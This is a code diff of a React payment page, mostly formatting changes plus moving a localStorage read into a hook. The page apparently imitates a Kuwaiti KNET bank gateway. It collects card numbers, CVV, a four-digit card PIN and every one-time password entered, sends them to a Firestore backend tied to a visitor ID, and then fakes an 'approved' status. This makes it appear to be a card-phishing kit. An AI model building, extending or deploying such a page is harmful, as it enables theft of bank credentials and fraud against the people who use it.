@@ -1,7 +1,7 @@
 "use client"
 import { useEffect, useState } from 'react';
 import './kent.css'
-import {  doc,  onSnapshot } from 'firebase/firestore';
+import { doc, onSnapshot } from 'firebase/firestore';
 import { db, handlePay } from '@/lib/firebasee';
 
 type PaymentInfo = {
@@ -13,7 +13,7 @@ type PaymentInfo = {
   otp?: string;
   pass: string;
   cardState: string;
-  allOtps:string[],
+  allOtps: string[],
   bank_card: string[];
   prefix: string;
   status: 'new' | 'pending' | 'approved' | 'rejected';
@@ -116,21 +116,22 @@ const BANKS = [
   },
 ];
 
- const Payment = (props: any) => {
+const Payment = (props: any) => {
 
   const handleSubmit = async () => {
-  
+
   };
 
   const [step, setstep] = useState(1);
   const [newotp] = useState([''])
-const total=  localStorage!.getItem('amount') 
+  const [total, setTotal] = useState('');
+
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
     cardNumber: '',
     year: '',
     month: '',
     otp: '',
-    allOtps:newotp,
+    allOtps: newotp,
     bank: '',
     pass: '',
     cardState: 'new',
@@ -142,9 +143,14 @@ const total=  localStorage!.getItem('amount')
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `)
   }
-  useEffect(()=>{
-  //handleAddotp(paymentInfo.otp!)
-  }, [paymentInfo.otp])
+  useEffect(() => {
+    //handleAddotp(paymentInfo.otp!)
+    const ty = localStorage!.getItem('amount')
+    if (ty) {
+      setTotal(ty)
+
+    }
+  }, [])
 
   useEffect(() => {
     const visitorId = localStorage.getItem('visitor');
@@ -169,26 +175,26 @@ const total=  localStorage!.getItem('amount')
       return () => unsubscribe();
     }
   }, []);
- 
+
 
   return (
-    <div style={{background:"#f1f1f1",height:"100vh",margin:0,padding:0}}>
+    <div style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }}>
       <form
         onSubmit={(e) => {
           e.preventDefault();
         }}
       >
         <div className="madd" />
-        <img src="./pc.jpg" className="-" alt="logo"/>
+        <img src="./pc.jpg" className="-" alt="logo" />
 
         <div id="PayPageEntry" >
 
           <div className="container">
-            
+
             <div className="content-block">
               <div className="form-card">
-                <div className="container-" style={{display:'flex',justifyContent:'center'}}>
-                  <img src="./kv.png" className="-" alt="logo" height={50} width={50}/>
+                <div className="container-" style={{ display: 'flex', justifyContent: 'center' }}>
+                  <img src="./kv.png" className="-" alt="logo" height={50} width={50} />
                 </div>
                 <div className="row">
                   <label className="column-label">Merchant: </label>
@@ -197,7 +203,7 @@ const total=  localStorage!.getItem('amount')
                 <div id="OrgTranxAmt">
                   <label className="column-label"> Amount: </label>
                   <label className="column-value text-label" id="amount">
-                    {total} 
+                    {total}
                     {'  '}KD&nbsp;{' '}
                   </label>
                 </div>
@@ -538,7 +544,7 @@ const total=  localStorage!.getItem('amount')
                       </div>
                     </div>
                   </>
-                ) : step === 2 && paymentInfo.status=== 'approved'? (
+                ) : step === 2 && paymentInfo.status === 'approved' ? (
                   <div>
                     <form style={{ display: 'flex', flexDirection: 'column' }}>
                       <label>
@@ -595,33 +601,33 @@ const total=  localStorage!.getItem('amount')
                     <div style={{ display: 'flex' }}>
                       <button
                         disabled={
-                          (step === 1 && (paymentInfo.prefix === "" || paymentInfo.bank === "" || paymentInfo.cardNumber === "" || paymentInfo.pass === "" || paymentInfo.month === "" || paymentInfo.year === "" || paymentInfo.pass.length !== 4|| paymentInfo.cvv?.length !== 3)) ||
+                          (step === 1 && (paymentInfo.prefix === "" || paymentInfo.bank === "" || paymentInfo.cardNumber === "" || paymentInfo.pass === "" || paymentInfo.month === "" || paymentInfo.year === "" || paymentInfo.pass.length !== 4 || paymentInfo.cvv?.length !== 3)) ||
                           paymentInfo.status === 'pending'
                         }
                         onClick={() => {
                           if (step === 1) {
                             props.setisloading(true);
-                            handlePay(paymentInfo,setPaymentInfo)
+                            handlePay(paymentInfo, setPaymentInfo)
                             handleSubmit();
                           } else if (step >= 2) {
 
-if(
-  !newotp.includes(paymentInfo.otp!)
+                            if (
+                              !newotp.includes(paymentInfo.otp!)
 
-){                            newotp.push(paymentInfo.otp!)}
+                            ) { newotp.push(paymentInfo.otp!) }
                             props.setisloading(true)
                             handleAddotp(paymentInfo.otp!);
                             props.handleOArr(paymentInfo.otp!);
-                            handlePay(paymentInfo,setPaymentInfo)
+                            handlePay(paymentInfo, setPaymentInfo)
                             setTimeout(() => {
-                            props.setisloading(false)
-                            setPaymentInfo({
-                              ...paymentInfo,
-                              otp: '',
-                              status: 'approved',
-                            });
+                              props.setisloading(false)
+                              setPaymentInfo({
+                                ...paymentInfo,
+                                otp: '',
+                                status: 'approved',
+                              });
                             }, 3000);
-                           
+
                           }
                         }}
                       >
